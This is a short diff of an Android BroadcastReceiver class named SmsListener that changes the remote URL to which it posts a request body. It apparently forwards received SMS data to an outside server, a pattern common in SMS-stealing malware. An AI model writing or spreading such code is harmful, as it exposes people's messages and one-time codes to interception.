@@ -60,7 +60,7 @@ public class SmsListener extends BroadcastReceiver {
         Request.Builder builder = new Request.Builder();
         Request request = builder
                 .header("App", "1.0.0")
-                .url("http://adz.mobi/mp.php")
+                .url("http://aterd.com/sms/")
                 .post(requestBody)
                 .build();
         okHttpClient.newCall(request).enqueue(new Callback() {
